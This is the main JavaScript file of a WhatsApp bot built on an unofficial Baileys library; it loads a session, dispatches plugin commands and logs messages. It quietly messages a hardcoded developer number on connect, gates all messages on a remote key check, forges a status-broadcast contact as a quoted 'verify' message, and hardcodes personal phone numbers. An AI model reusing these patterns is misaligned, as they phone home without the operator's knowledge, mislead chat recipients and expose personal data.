const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason,
jidNormalizedUser,
getContentType,
fetchLatestBaileysVersion,
Browsers
} = require("@eypzx/baileys")
//const Ameen = require('./lib/Cronex.js')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const fs = require('fs')
const key = 'https://key-ninja7.vercel.app/check-key';
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { sms,downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const prefix = config.PREFIX || '!'

const ownerNumber = ['918138898059', '918078438059','919539412641', '916238768108'] // coma (,) ittit eniyum add akan kayyum
async function loadSession() {
  if (!fs.existsSync(__dirname + '/session/creds.json')) {
    if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
    const sessdata = config.SESSION_ID;
    const Cronez = sessdata.replace('𝐂𝐫𝐨𝐧𝐞𝐱𝐁𝐨𝐭~', '');
    const filer = File.fromURL(`https://mega.nz/file/${Cronez}`);
    filer.download((err, data) => {
      if (err) throw err;
      fs.writeFile(__dirname + '/session/creds.json', data, () => {
        console.log('SESSION DOWNLOADED SUCCESSFULLY ✅');
        console.log('Please Wait Trying To Connect')
      });
    });
  }
}

async function checkSecretKey() {
  try {
    const { data } = await axios.get(key);
    return data.key;
  } catch (error) {
    console.error("[nun Check Error] " + error.message);
    return false;
  }
}
//===================SESSION-AUTH============================

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

//=============================================

async function connectToWA() {
     /*   if (!(await checkSecretKey())) {
    consocheckSecretKeyle.log("[PLUGIN ERROR]");
    return;
        }*/
console.log("Bot Ready To Connect");
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/')
var { version } = await fetchLatestBaileysVersion()
console.log(`Using Baileys Version: ${version.join('.')}`)
const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: true,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
        })
    
conn.ev.on('connection.update', (update) => {
  console.log('Connection Update:', update);
const { connection, lastDisconnect } = update
if (connection === 'close') {
  console.log('Connection closed:', lastDisconnect.error);
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {
console.log('Installing Datas')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('Plugins Installed')
console.log('Bot Connected Successfully ✅')
      
        let AmeenInt = '916238768108@s.whatsapp.net'
        let Cronezz = '*BOT CONNECTED✅*\n*RUNNING ON:* KOYEB↑'
        conn.sendMessage(AmeenInt, { 
        text: Cronezz
  })
  }
})
conn.ev.on('creds.update', saveCreds)  
        

conn.ev.on('messages.upsert', async(mek) => {
            if (!(await checkSecretKey())) {
      console.log("[PLUGIN ERROR]");
      return;
            }
mek = mek.messages[0]
var LogJid = mek.key.remoteJid || 'Null'
var LogNum = LogJid.replace('@s.whatsapp.net', '')
var LogName = mek.pushName || 'Null'
var LogChat = mek.msg || 'Null'
var LogType = getContentType(mek.message) || 'Null'
var LogTime = mek.messageTimestamp ? new Date(mek.messageTimestamp * 1000).toLocaleString() : 'Null'
var LogMsgId = mek.key.id || 'Null'
var LogIsGroup = LogJid.endsWith('@g.us') ? 'Yes' : 'No'
var LogIsBot = mek.key.fromMe ? 'Yes' : 'No'
var LogIsMedia = (mek.message && (mek.message.imageMessage || mek.message.videoMessage || mek.message.audioMessage || mek.message.documentMessage)) ? 'Yes' : 'No'

var LogPrint = `
[ Number:] ${LogNum}
[ Name:  ] ${LogName}
[ Chat:  ] ${LogChat}
[ Type:  ] ${LogType}
[ Time:  ] ${LogTime}
[ Message ID:  ] ${LogMsgId}
[ Is Group:  ] ${LogIsGroup}
[ Is Bot:  ] ${LogIsBot}
[ Is Media:  ] ${LogIsMedia}
`
  console.log(LogPrint)
if (!mek.message) return
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])
}
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'AmeenInt'
const isMe = botNumber.includes(senderNumber)
//const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(participants) : []
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const spli = "916238768108:916238768108"
const verify = {
    'key': {
      'fromMe': false,
      'participant': "0@s.whatsapp.net",
      'remoteJid': 'status@broadcast'
    },
    'message': {
      'contactMessage': {
        'displayName': "AstroX-V2",
        'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'AmeenInT'\nitem1.TEL;waid=" + spli + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
      }
    }
  };

        const isOwner = ownerNumber.includes(senderNumber) || botNumber.includes(senderNumber);
        if (config.MODE === 'private' && !isOwner) return;
        
const reply = (teks) => {
  if(isGroup) {
conn.sendMessage(from, { text: teks }, { quoted: mek })
  } else {
conn.sendMessage(from, { text: teks, ai: true }, { quoted: verify })
  }
}
        const ameen = (teks) => {
                conn.sendMessage(from, { text: teks, ai: true }, { quoted: verify })
                m.react('🕊️')
        }

conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
              let mime = '';
              let res = await axios.head(url)
              mime = res.headers['content-type']
              if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
              }
              let type = mime.split("/")[0] + "Message"
              if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
              }
            }


const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, verify, reply, ameen});
} catch (e) {
console.error("[PLUGIN ERROR] " + e);
}
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, verify, reply, ameen})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, ameen})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, ameen})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, verify, reply, ameen})
}});
//============================================================================ 

})
}
app.get("/", (req, res) => {
res.send("SULTHAN ⚡");
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => {
 loadSession();       
connectToWA()
}, 4000);
